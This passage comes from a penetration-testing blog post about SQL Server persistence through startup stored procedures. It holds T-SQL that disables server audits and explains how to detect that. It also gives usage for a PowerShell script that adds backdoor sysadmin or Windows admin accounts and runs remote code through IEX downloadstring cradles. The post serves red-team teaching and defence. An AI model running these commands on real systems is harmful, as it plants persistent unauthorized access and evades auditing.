+ALTER SERVER AUDIT Audit_StartUp_Procs
+WITH (STATE = OFF)
+DROP SERVER AUDIT Audit_StartUp_Procs
+
+-- Disable and remove SERVER AUDIT SPECIFICATION
+ALTER SERVER AUDIT SPECIFICATION Audit_StartUp_Procs_Server_Spec
+WITH (STATE = OFF)
+DROP SERVER AUDIT SPECIFICATION Audit_StartUp_Procs_Server_Spec
+
+-- Disable and remove DATABASE AUDIT SPECIFICATION
+ALTER DATABASE AUDIT SPECIFICATION Audit_StartUp_Procs_Database_Spec
+WITH (STATE = OFF)
+DROP DATABASE AUDIT SPECIFICATION Audit_StartUp_Procs_Database_Spec</pre>
+<pre class="lang:tsql decode:true"></pre>
+<p><strong>So&#8230;</strong><br />
+If an attacker decides to be clever and disable the audit settings it will also show up under event ID 33205. In this case, the statement will include &#8220;ALTER SERVER AUDIT&#8221; or &#8220;DROP SERVER AUDIT&#8221; along with the rest of the statement. Also, &#8220;object_name&#8221; will be the name of the SERVER AUDIT. This is another thing that shouldn&#8217;t change very often in production environments so it&#8217;s a good this to watch. Below is a basic screenshot example.</p>
+<p><img class="alignnone size-large wp-image-6102" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20640%20453'%3E%3C/svg%3E" alt="SQL_Persistence_Pt1_Sutherland_8" width="640" height="453" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_8-1024x725.png" /><noscript><img class="alignnone size-large wp-image-6102" src="https://www.netspi.com/wp-content/uploads/2016/03/SQL_Persistence_Pt1_Sutherland_8-1024x725.png" alt="SQL_Persistence_Pt1_Sutherland_8" width="640" height="453" /></noscript></p>
+<h3 id="powershell">Automating the Attack</h3>
+<p>I put together a little PowerShell script called &#8220;Invoke-SqlServer-Persist-StartupSp.psm1&#8221; to automate the attack. Below are some basic usage instructions for those who are interested.</p>
+<ol>
+<li>Download the script or reflectively load it from <a href="https://raw.githubusercontent.com/NetSPI/PowerShell/master/Invoke-SqlServer-Persist-StartupSp.psm1">here</a>.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/NetSPI/PowerShell/master/Invoke-SqlServer-Persist-StartupSp.psm1')</pre>
+</li>
+<li>The example below shows how to add a SQL Server sysadmin via a startup stored procedure every time the SQL Server service is restarted.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance "MSSQL2008WIN8" -NewSqlUser EvilSysadmin1 -NewSqlPass Password123!</pre>
+<p><img class="alignnone size-full wp-image-6142" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20596%20294'%3E%3C/svg%3E" alt="Add-Sysadmin" width="596" height="294" data-lazy-srcset="https://www.netspi.com/wp-content/uploads/2016/03/Add-Sysadmin.png 596w, https://www.netspi.com/wp-content/uploads/2016/03/Add-Sysadmin-300x148.png 300w" data-lazy-sizes="(max-width: 596px) 100vw, 596px" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/Add-Sysadmin.png" /><noscript><img class="alignnone size-full wp-image-6142" src="https://www.netspi.com/wp-content/uploads/2016/03/Add-Sysadmin.png" alt="Add-Sysadmin" width="596" height="294" srcset="https://www.netspi.com/wp-content/uploads/2016/03/Add-Sysadmin.png 596w, https://www.netspi.com/wp-content/uploads/2016/03/Add-Sysadmin-300x148.png 300w" sizes="(max-width: 596px) 100vw, 596px" /></noscript></li>
+<li>The example below shows how to add a local Windows Administrator via a startup stored procedure every time the SQL Server service is restarted.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance "MSSQL2008WIN8" -NewosUser Evilosadmin1 -NewosPass Password123!</pre>
+<p><img class="alignnone size-full wp-image-6143" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20597%20294'%3E%3C/svg%3E" alt="Add-OsAdmin" width="597" height="294" data-lazy-srcset="https://www.netspi.com/wp-content/uploads/2016/03/Add-OsAdmin.png 597w, https://www.netspi.com/wp-content/uploads/2016/03/Add-OsAdmin-300x148.png 300w" data-lazy-sizes="(max-width: 597px) 100vw, 597px" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/Add-OsAdmin.png" /><noscript><img class="alignnone size-full wp-image-6143" src="https://www.netspi.com/wp-content/uploads/2016/03/Add-OsAdmin.png" alt="Add-OsAdmin" width="597" height="294" srcset="https://www.netspi.com/wp-content/uploads/2016/03/Add-OsAdmin.png 597w, https://www.netspi.com/wp-content/uploads/2016/03/Add-OsAdmin-300x148.png 300w" sizes="(max-width: 597px) 100vw, 597px" /></noscript></li>
+<li>The example below shows how to run arbitrary PowerShell code via a startup stored procedure every time the SQL Server service is restarted.
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance "MSSQL2008WIN8" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"</pre>
+<p><img class="alignnone size-full wp-image-6144" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20595%20294'%3E%3C/svg%3E" alt="Add-PsCmd" width="595" height="294" data-lazy-srcset="https://www.netspi.com/wp-content/uploads/2016/03/Add-PsCmd.png 595w, https://www.netspi.com/wp-content/uploads/2016/03/Add-PsCmd-300x148.png 300w" data-lazy-sizes="(max-width: 595px) 100vw, 595px" data-lazy-src="https://www.netspi.com/wp-content/uploads/2016/03/Add-PsCmd.png" /><noscript><img class="alignnone size-full wp-image-6144" src="https://www.netspi.com/wp-content/uploads/2016/03/Add-PsCmd.png" alt="Add-PsCmd" width="595" height="294" srcset="https://www.netspi.com/wp-content/uploads/2016/03/Add-PsCmd.png 595w, https://www.netspi.com/wp-content/uploads/2016/03/Add-PsCmd-300x148.png 300w" sizes="(max-width: 595px) 100vw, 595px" /></noscript></li>
+</ol>
+<h3>Wrap Up</h3>
+<p>In this blog I covered how to create, detect, and remove malicious startup stored procedures in SQL Server. Hopefully, this will help create some awareness around this type of persistence method. Big thanks to Grisha Kumar and Ben Tindell for verifying all the code samples for this blog. Have fun and hack responsibly!</p>
+<p><b>Note</b>: All testing was done on Windows 8 running SQL Server 2014 Standard Edition.</p>
+<h3>References</h3>
+<ul>
+<li><a href="https://technet.microsoft.com/en-us/library/aa174792(v=sql.110).aspx" target="_blank" rel="noopener noreferrer">https://technet.microsoft.com/en-us/library/aa174792(v=sql.110).aspx</a></li>
+<li><a href="https://technet.microsoft.com/en-us/library/ms181720(v=sql.110).aspx" target="_blank" rel="noopener noreferrer">https://technet.microsoft.com/en-us/library/ms181720(v=sql.110).aspx</a></li>
+<li><a href="https://technet.microsoft.com/en-us/library/dd392015%28v=sql.100%29.aspx" target="_blank" rel="noopener noreferrer">https://technet.microsoft.com/en-us/library/dd392015%28v=sql.100%29.aspx</a></li>
+<li><a href="https://msdn.microsoft.com/en-us/library/cc280663(v=sql.100).aspx" target="_blank" rel="noopener noreferrer">https://msdn.microsoft.com/en-us/library/cc280663(v=sql.100).aspx</a></li>
+<li><a href="https://cprovolt.wordpress.com/2013/08/02/sql-server-audit-action_id-list/" target="_blank" rel="noopener noreferrer">https://cprovolt.wordpress.com/2013/08/02/sql-server-audit-action_id-list/</a></li>
+</ul>
+                                <div class="host-social-links">
+                                    <span>SHARE</span>
+                                    <a href="https://twitter.com/intent/tweet/?text=Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures&amp;url=https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener" aria-label="">
+                                        <em class="fab fa-twitter"></em>
+                                    </a>
+                                    <!-- Sharingbutton Facebook -->
+                                    <a href="https://facebook.com/sharer/sharer.php?u=https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener" aria-label="">
+                                        <em class="fab fa-facebook-f"></em>
+                                    </a>
+                                    <!-- Sharingbutton LinkedIn -->
+                                    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/&amp;title=Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures&amp;summary=Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures&amp;source=https://www.netspi.com" target="_blank" rel="noopener" aria-label="">
+                                        <em class="fab fa-linkedin-in"></em>
+                                    </a>
+                                    <div class="pdfprnt-buttons"><a href="https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/?print=pdf" class="pdfprnt-button pdfprnt-button-pdf" target="_blank"><img width="32" height="32" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2032%2032'%3E%3C/svg%3E" alt="image_pdf" title="View PDF" data-lazy-src="https://www.netspi.com/wp-content/plugins/pdf-print/images/pdf.png" /><noscript><img width="32" height="32" src="https://www.netspi.com/wp-content/plugins/pdf-print/images/pdf.png" alt="image_pdf" title="View PDF" /></noscript></a><a href="https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-persistence-part-1-startup-stored-procedures/?print=print" class="pdfprnt-button pdfprnt-button-print" target="_blank"><img width="32" height="32" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2032%2032'%3E%3C/svg%3E" alt="image_print" title="Print Content" data-lazy-src="https://www.netspi.com/wp-content/plugins/pdf-print/images/print.png" /><noscript><img width="32" height="32" src="https://www.netspi.com/wp-content/plugins/pdf-print/images/print.png" alt="image_print" title="Print Content" /></noscript></a></div>                                </div>																	
+
+                                                                <div class="author-profile-info row">                                
+                                                                            <div class="col s12 m12 l6 xl6">
+                                            <div class="d-flex flex-wrap align-items-center">
+                                                <div class="col-left">
+                                                    <a href="https://www.netspi.com/author/scott-sutherland/" title="Scott Sutherland">
+                                                        <span class="profile-icon">
+                                                            <img data-del="avatar" alt='' src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2096%2096'%3E%3C/svg%3E" class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96' data-lazy-src="https://www.netspi.com/wp-content/uploads/Scott_Sutherland.jpg"/><noscript><img data-del="avatar" alt='' src='https://www.netspi.com/wp-content/uploads/Scott_Sutherland.jpg' class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96'/></noscript>																	
+                                                        </span>
+                                                    </a>
+                                                </div>                                        
+                                                <div class="col-right1">
+                                                    <div class="moreby-post-title1">
+                                                        <a href="https://www.netspi.com/author/scott-sutherland/" title="Scott Sutherland">Scott Sutherland</a>									
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+    
+                                </div>
+                            </div>
+                        </div>                
+                    </div>
+                </div>
+            </div>
+
+                        <!-- Lists section start--> 
+            <section class="section-padding-md blog-client-post">
+                <div class="container">
+                    <div class="box-layout">
+                        <div class="row d-flex flex-wrap">
+                            <div class="col s12">
+                                <div class="box-para">
+                                    <h3 class="blog-post-title">Recent Posts</h3>
+                                </div>
+                                                                    <div class="row d-flex flex-wrap">
+                                                                                    <div class="col s12 m6 l4 xl4 card-holder">
+                                                <div class="card">
+                                                    <div class="card-image">
+                                                        <img width="832" height="451" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20832%20451'%3E%3C/svg%3E" alt="Giving Azure a REST – Expanding REST API Capabilities" data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/05/giving-azure-a-rest-blog-feature.png"><noscript><img width="832" height="451" src="https://www.netspi.com/wp-content/uploads/2021/05/giving-azure-a-rest-blog-feature.png" alt="Giving Azure a REST – Expanding REST API Capabilities"></noscript>												
+                                                    </div>
+                                                    <div class="card-content">
+                                                        <div class="row category-box">
+                                                            <span class="new badge left" data-badge-caption=""><a href="https://www.netspi.com/blog/technical/">Technical Blog</a></span><span class="new badge left" data-badge-caption=""><a href="https://www.netspi.com/blog/technical/cloud-penetration-testing/">Cloud Penetration Testing</a></span>                                                        </div>
+                                                        <div class='post-date'>May 13, 2021</div>
+                                                        <h3 class='card-title'>
+                                                            <a href="https://www.netspi.com/blog/technical/cloud-penetration-testing/giving-azure-a-rest/">Giving Azure a REST – Expanding REST API Capabilities</a>
+                                                        </h3>
+
+                                                        <div class="author-profile-info">
+                                                            <div class="d-flex flex-wrap align-items-center">
+                                                                <div class="col-left">
+                                                                    <a href="https://www.netspi.com/author/josh-magri/" title="Josh Magri">
+                                                                        <span class="profile-icon">
+                                                                            <img data-del="avatar" alt='' src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2096%2096'%3E%3C/svg%3E" class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96' data-lazy-src="https://www.netspi.com/wp-content/uploads/2021/05/Josh-Magri-Headshot.jpg"/><noscript><img data-del="avatar" alt='' src='https://www.netspi.com/wp-content/uploads/2021/05/Josh-Magri-Headshot.jpg' class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96'/></noscript>																	
+                                                                        </span>
+                                                                    </a>
+                                                                </div>
+                                                                <div class="col-right">
+                                                                    <div class="moreby-post-title">
+                                                                                                                                                    <a href="https://www.netspi.com/author/josh-magri/" title="Josh Magri">Josh Magri</a>
+                                                                                                                                            </div>
+                                                                </div>
+                                                            </div>											
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                                                                    <div class="col s12 m6 l4 xl4 card-holder">
+                                                <div class="card">
+                                                    <div class="card-image">
+                                                        <img width="834" height="451" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20834%20451'%3E%3C/svg%3E" alt="Dockerizing the NetSPI Linux Labs" data-lazy-src="https://www.netspi.com/wp-content/uploads/Tech-Blog_05.jpg"><noscript><img width="834" height="451" src="https://www.netspi.com/wp-content/uploads/Tech-Blog_05.jpg" alt="Dockerizing the NetSPI Linux Labs"></noscript>												
+                                                    </div>
+                                                    <div class="card-content">
+                                                        <div class="row category-box">
+                                                            <span class="new badge left" data-badge-caption=""><a href="https://www.netspi.com/blog/technical/">Technical Blog</a></span><span class="new badge left" data-badge-caption=""><a href="https://www.netspi.com/blog/technical/network-penetration-testing/">Network Penetration Testing</a></span>                                                        </div>
+                                                        <div class='post-date'>March 25, 2021</div>
+                                                        <h3 class='card-title'>
+                                                            <a href="https://www.netspi.com/blog/technical/network-penetration-testing/finding-root-a-netspi-enhanced-journey/">Dockerizing the NetSPI Linux Labs</a>
+                                                        </h3>
+
+                                                        <div class="author-profile-info">
+                                                            <div class="d-flex flex-wrap align-items-center">
+                                                                <div class="col-left">
+                                                                    <a href="https://www.netspi.com/author/shorvath/" title="Sam Horvath">
+                                                                        <span class="profile-icon">
+                                                                            <img data-del="avatar" alt='' src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2096%2096'%3E%3C/svg%3E" class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96' data-lazy-src="https://www.netspi.com/wp-content/uploads/1563373600203.jpeg"/><noscript><img data-del="avatar" alt='' src='https://www.netspi.com/wp-content/uploads/1563373600203.jpeg' class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96'/></noscript>																	
+                                                                        </span>
+                                                                    </a>
+                                                                </div>
+                                                                <div class="col-right">
+                                                                    <div class="moreby-post-title">
+                                                                                                                                                    <a href="https://www.netspi.com/author/shorvath/" title="Sam Horvath">Sam Horvath</a>
+                                                                                                                                            </div>
+                                                                </div>
+                                                            </div>											
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                                                                    <div class="col s12 m6 l4 xl4 card-holder">
+                                                <div class="card">
+                                                    <div class="card-image">
+                                                        <img width="832" height="451" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20832%20451'%3E%3C/svg%3E" alt="CVE-2020-17049: Kerberos Bronze Bit Attack - Overview" data-lazy-src="https://www.netspi.com/wp-content/uploads/Tech-Blog_04.jpg"><noscript><img width="832" height="451" src="https://www.netspi.com/wp-content/uploads/Tech-Blog_04.jpg" alt="CVE-2020-17049: Kerberos Bronze Bit Attack - Overview"></noscript>												
+                                                    </div>
+                                                    <div class="card-content">
+                                                        <div class="row category-box">
+                                                            <span class="new badge left" data-badge-caption=""><a href="https://www.netspi.com/blog/technical/">Technical Blog</a></span><span class="new badge left" data-badge-caption=""><a href="https://www.netspi.com/blog/technical/network-penetration-testing/">Network Penetration Testing</a></span>                                                        </div>
+                                                        <div class='post-date'>December 8, 2020</div>
+                                                        <h3 class='card-title'>
+                                                            <a href="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-overview/">CVE-2020-17049: Kerberos Bronze Bit Attack - Overview</a>
+                                                        </h3>
+
+                                                        <div class="author-profile-info">
+                                                            <div class="d-flex flex-wrap align-items-center">
+                                                                <div class="col-left">
+                                                                    <a href="https://www.netspi.com/author/jkarnes/" title="Jake Karnes">
+                                                                        <span class="profile-icon">
+                                                                            <img data-del="avatar" alt='' src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2096%2096'%3E%3C/svg%3E" class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96' data-lazy-src="https://www.netspi.com/wp-content/uploads/Jake_Karnes-Headshot-scaled.jpeg"/><noscript><img data-del="avatar" alt='' src='https://www.netspi.com/wp-content/uploads/Jake_Karnes-Headshot-scaled.jpeg' class='avatar pp-user-avatar avatar-96 photo ' height='96' width='96'/></noscript>																	
+                                                                        </span>
+                                                                    </a>
+                                                                </div>
+                                                                <div class="col-right">
+                                                                    <div class="moreby-post-title">
+                                                                                                                                                    <a href="https://www.netspi.com/author/jkarnes/" title="Jake Karnes">Jake Karnes</a>
+                                                                                                                                            </div>
+                                                                </div>
+                                                            </div>											
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                         
+                                    </div>
+                                                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- Lists section end--> 
+            </article>
+
+	</main><!-- #main -->
+
+
+<section class="top-footer-wrapper top-footer-view footer-top">
+  <div class="container">
+    <div class="row flex-item">
+      <div class="col s12 m12 l6">
+        <div class="form-quots">
+          <div class="title-h3 form-title">Need a <span class="color-CE112D">Quote?</span></div><iframe loading="lazy" style="border: 0;" src="about:blank" width="100%" height="900" frameborder="0" data-rocket-lazyload="fitvidscompatible" data-lazy-src="https://pardot.netspi.com/l/427532/2021-04-14/2l3vy6"></iframe><noscript><iframe style="border: 0;" src="https://pardot.netspi.com/l/427532/2021-04-14/2l3vy6" width="100%" height="900" frameborder="0"></iframe></noscript>        </div>
+      </div>
+      <div class="col s12 m12 l6">
+        <div class="accordion-view footer-accordion">
+          <div class="title-h3 accordion-title">Common Questions</div><!--<div class="accordion"></div>
+<div class="panel">
+<p></p>
+</div>-->
+
+<div class="accordion">
+  <a>
+    What is Penetration Testing as a Service (PTaaS)? 
+    <em class="fa fa-plus"></em>
+  </a>
+  <div class="panel">
+    <p>PTaaS is NetSPI’s delivery model for penetration testing. It enables customers to simplify the scoping of new engagements, view their testing results in real time, orchestrate faster remediation, perform always-on continuous testing, and more - all through the Resolve™ vulnerability management and orchestration platform. <span>
+<a class="btn-text relative-btn" href="/services/penetration-testing-as-a-service/" target="_self" tabindex="0">
+    Learn More <img loading="lazy" class="black-arrow" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2021'%3E%3C/svg%3E" width="27" height="21" data-lazy-src="/wp-content/themes/netspi/assets/images/white-arrow.svg"><noscript><img loading="lazy" class="black-arrow" src="/wp-content/themes/netspi/assets/images/white-arrow.svg" width="27" height="21"></noscript>
+    <img loading="lazy" class="red-ic" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2027%2021'%3E%3C/svg%3E" width="27" height="21" data-lazy-src="/wp-content/themes/netspi/assets/images/red-arrow.svg"><noscript><img loading="lazy" class="red-ic" src="/wp-content/themes/netspi/assets/images/red-arrow.svg" width="27" height="21"></noscript>
+</a>
+</span></p>
+  </div>
+</div>
+
+<!--<div class="accordion"></div>
+<div class="panel">
+<p></p>
+</div>-->
+
+<div class="accordion">
+  <a>
+    Why should I use NetSPI? 
+    <em class="fa fa-plus"></em>
+  </a>
+  <div class="panel">
+    <p>We help organizations defend against adversaries by being the best at simulating real-world, sophisticated adversaries with the products, services, and training we provide. We know how attackers think and operate, allowing us to help our customers better defend against the threats they face daily.</p>
+  </div>
+</div>
+
+<!--<div class="accordion"></div>
+<div class="panel">
+<p></p>
+</div>-->
+
+<div class="accordion">
+  <a>
+    How does NetSPI ensure quality results? 
+    <em class="fa fa-plus"></em>
+  </a>
+  <div class="panel">
+    <p>At NetSPI, we believe that there is simply no replacement for human-led manual deep dive testing. Our Resolve platform delivers automation to ensure our people spend time looking for the critical vulnerabilities that tools miss. We provide automated and manual testing of all aspects of an organization’s entire attack surface, including external and internal network, application, cloud, and physical security.
+<br/><br/>
+Our proven methodology ensures that the client experience and our findings aren’t only as good as the latest tester assigned to your project. That consistency gives our customers assurance that if vulnerabilities exist, we will find them.</p>
+  </div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+</section>
+
+
+<footer id="main-footer" class="site-footer">
+  <div class="container">
+    <div class="row">
+      <div class="col s12 m12">
+        <div id="footer-widgets" class="footer-bottom-blocks" class="clearfix">
+          <div id="footer-sidebar1" class="footer-widget-block">
+            <div id="nav_menu-2" class="widget widget_nav_menu"><h4>Security Testing</h4><div class="menu-security-testing-container"><ul id="menu-security-testing" class="menu"><li id="menu-item-22046" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22046"><a href="https://www.netspi.com/security-testing/penetration-testing-as-a-service">PTaaS</a></li>
+<li id="menu-item-21614" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21614"><a href="https://www.netspi.com/security-testing/application-penetration-testing">Application Pentesting</a></li>
+<li id="menu-item-21615" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21615"><a href="https://www.netspi.com/security-testing/network-penetration-testing">Network Pentesting</a></li>
+<li id="menu-item-21618" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21618"><a href="https://www.netspi.com/security-testing/cloud-penetration-testing">Cloud Pentesting</a></li>
+<li id="menu-item-22700" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22700"><a href="https://www.netspi.com/security-testing/network-penetration-testing-host-based">Host-Based Pentesting</a></li>
+<li id="menu-item-22710" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22710"><a href="https://www.netspi.com/security-testing/adversary-simulation">Adversary Simulation</a></li>
+<li id="menu-item-21620" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21620"><a href="https://www.netspi.com/security-testing/secure-code-review">Secure Code Review</a></li>
+</ul></div></div>          </div>
+          <div id="footer-sidebar2" class="footer-widget-block">
+            <div id="nav_menu-3" class="widget widget_nav_menu"><h4>Resources</h4><div class="menu-resources-container"><ul id="menu-resources" class="menu"><li id="menu-item-22712" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22712"><a href="https://www.netspi.com/blogs/">Blog</a></li>
+<li id="menu-item-22711" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22711"><a href="https://www.netspi.com/agentofinfluence/">Podcasts</a></li>
+<li id="menu-item-23606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23606"><a href="https://www.netspi.com/resources/">Tip Sheets &#038; More</a></li>
+<li id="menu-item-23607" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23607"><a href="https://www.netspi.com/webinars/">Webinars</a></li>
+<li id="menu-item-23608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23608"><a href="https://www.netspi.com/open-source-tools/">Open Source Tools</a></li>
+<li id="menu-item-20891" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20891"><a target="_blank" rel="noopener" href="https://sqlwiki.netspi.com/">SQL Injection Wiki</a></li>
+</ul></div></div>          </div>
+          <div id="footer-sidebar3" class="footer-widget-block">
+            <div id="nav_menu-4" class="widget widget_nav_menu"><h4>Company</h4><div class="menu-company-container"><ul id="menu-company" class="menu"><li id="menu-item-22038" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22038"><a href="https://www.netspi.com/about-us/">About Us</a></li>
+<li id="menu-item-22713" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22713"><a href="https://www.netspi.com/case-studies/">Case Studies</a></li>
+<li id="menu-item-21123" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-21123"><a href="http://www.netspi.com/news/">News</a></li>
+<li id="menu-item-22039" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22039"><a href="https://www.netspi.com/events/">Events</a></li>
+<li id="menu-item-24934" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24934"><a href="https://www.netspi.com/careers/">Careers</a></li>
+<li id="menu-item-22041" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22041"><a href="https://www.netspi.com/glossary/">Glossary</a></li>
+</ul></div></div>          </div>
+          <div id="footer-sidebar4" class="footer-widget-block">
+            <div id="nav_menu-5" class="widget widget_nav_menu"><h4>Get in Touch</h4><div class="menu-get-in-touch-container"><ul id="menu-get-in-touch" class="menu"><li id="menu-item-21955" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21955"><a href="https://www.netspi.com/contact-us/">Contact Us</a></li>
+<li id="menu-item-22042" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-22042"><a href="https://www.netspi.com/contact-us/">Schedule a Demo</a></li>
+<li id="menu-item-21131" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-21131"><a href="tel:6124658880">612.465.8880</a></li>
+</ul></div></div><div id="text-5" class="widget widget_text">			<div class="textwidget"><div class="social-item"><a href="https://twitter.com/NetSPI" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a href="https://www.facebook.com/netspi/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook-f"></i></a><a href="https://www.linkedin.com/company/netspi/" target="_blank" rel="noopener noreferrer"><i class="fab fa-linkedin"></i></a></div>
+</div>
+		</div>          </div>
+          <div id="footer-sidebar5" class="footer-widget-block newsletter-widget">
+			<h4>Sign up for our newsletter</h4>
+            <iframe loading="lazy" style="border: 0;" src="about:blank" width="100%" height="300" frameborder="0" data-rocket-lazyload="fitvidscompatible" data-lazy-src="https://pardot.netspi.com/l/427532/2021-04-08/2l3p5s"></iframe><noscript><iframe style="border: 0;" src="https://pardot.netspi.com/l/427532/2021-04-08/2l3p5s" width="100%" height="300" frameborder="0"></iframe></noscript>          </div>
+                  </div>
+      </div>
+    </div>
+    <div class="clear"></div>
+    <div class="row">
+      <div class="col s12 m12">
+        <div class="footer-bottom section-padding-xs">
+          <div class="copyright-section">
+            <div id="footer-info" class="footer-copyright-text">© 2021 NetSPI LLC.</div><div class="copyright-menu"><ul id="menu-legal-menu" class="menu"><li id="menu-item-22043" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-22043"><a href="https://www.netspi.com/privacy-policy/">Privacy Policy</a></li>
+</ul></div>          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+</div>
+
+
+	<div class="mysticky-welcomebar-fixed mysticky-welcomebar-position-top mysticky-welcomebar-showx-desktop mysticky-welcomebar-showx-mobile mysticky-welcomebar-btn-desktop mysticky-welcomebar-btn-mobile mysticky-welcomebar-display-desktop mysticky-welcomebar-display-mobile mysticky-welcomebar-attention-default mysticky-welcomebar-entry-effect-slide-in" style="" data-after-triger="after_a_few_seconds" data-triger-sec="0" data-position="top" data-height="60" data-rediect="redirect_to_url" data-aftersubmission="show_welcomebar_next_visit">
+		<div class="mysticky-welcomebar-fixed-wrap">
+			<div class="mysticky-welcomebar-content">
+				<p>NetSPI Secures $90 Million in Growth Funding Led by KKR</p>
+			</div>
+			<div class="mysticky-welcomebar-btn">
+				<a href="https://www.netspi.com/news/press-release/cybersecurity-funding-investment-kkr/" >Learn More</a>
+			</div>
+			<a href="javascript:void(0)" class="mysticky-welcomebar-close">X</a>		
+		</div>
+	</div>
+	
+	<style>
+	.mysticky-welcomebar-fixed , .mysticky-welcomebar-fixed * {
+		-webkit-box-sizing: border-box;
+		-moz-box-sizing: border-box;
+		box-sizing: border-box;
+	}
+	.mysticky-welcomebar-fixed {
+		background-color: #ce112d;
+		font-family: Roboto;
+		position: fixed;
+		left: 0;
+		right: 0;
+		z-index: 9999999;
+		opacity: 0;
+	}
+	.mysticky-welcomebar-fixed-wrap {
+		min-height: 60px;
+		padding: 20px 50px;
+		display: flex;
+		align-items: center;
+		justify-content: center;
+		width: 100%;
+		height: 100%;
+	}
+	.mysticky-welcomebar-animation {
+		-webkit-transition: all 1s ease 0s;
+		-moz-transition: all 1s ease 0s;
+		transition: all 1s ease 0s;
+	}
+	.mysticky-welcomebar-position-top {
+		top:0;
+	}
+	.mysticky-welcomebar-position-bottom {
+		bottom:0;
+	}
+	.mysticky-welcomebar-position-top.mysticky-welcomebar-entry-effect-slide-in {
+		top: -60px;
+	}
+	.mysticky-welcomebar-position-bottom.mysticky-welcomebar-entry-effect-slide-in {
+		bottom: -60px;
+	}
+	.mysticky-welcomebar-entry-effect-fade {
+		opacity: 0;
+	}
